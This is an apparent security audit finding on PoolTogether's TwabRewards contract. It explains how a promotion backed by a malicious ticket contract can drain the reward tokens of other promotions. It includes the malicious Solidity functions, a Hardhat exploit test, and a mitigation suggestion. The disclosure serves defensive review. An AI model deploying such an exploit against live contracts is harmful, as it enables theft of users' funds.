# Handle  johnnycash   # Vulnerability details  ## Impact  It allows an attacker to retrieve all the tokens of each promotions.   ## Analysis  Anyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:  - the address of a malicious ticket smart contract - the token address from the targeted promotion(s) - optionally, `_numberOfEpochs` equal to 0 to create this promotion for free  The only verification made on the ticket address given by [_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.  The attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.  1. `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount. 2. `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.  The attacker receives the tokens of other promotions without having spent anything.   ## Proof of Concept  The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol)with the following changes:  ```     /// @inheritdoc ITicket     function getAverageTotalSuppliesBetween(         uint64[] calldata _startTimes,         uint64[] calldata _endTimes     ) external view override returns (uint256[] memory) {         uint256[] memory _balances = new uint256[](1);         _balances[0] = uint256(1);         return _balances;     }      /// @inheritdoc ITicket     function getAverageBalanceBetween(         address _user,         uint64 _startTime,         uint64 _endTime     ) external view override returns (uint256) {         return 1337;     } ```  The test for HardHat is:  ```     describe('exploit()', async () => {         it('this shouldnt happen', async () => {             const promotionIdOne = 1;             const promotionIdTwo = 2;              await expect(createPromotion(ticket.address))                 .to.emit(twabRewards, 'PromotionCreated')                 .withArgs(promotionIdOne);                          let evilTicketFactory = await getContractFactory('EvilTicket');             let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);             let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;             await expect(twabRewards.connect(wallet2).createPromotion(                 evilTicket.address,                 rewardToken.address,                 tokensPerEpoch,                 createPromotionTimestamp,                 1,//epochDuration,                 0,//epochsNumber,             )).to.emit(twabRewards, 'PromotionCreated')               .withArgs(promotionIdTwo);              await increaseTime(100);             const epochIds = ['100'];             await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);         });     }); ```  It results in the following error:  ```  1) TwabRewards        exploit()          this shouldnt happen:      Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'       at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)       at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)       at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)       at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)       at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)       at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186) ```   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  Maybe add a whitelist of trusted tickets?
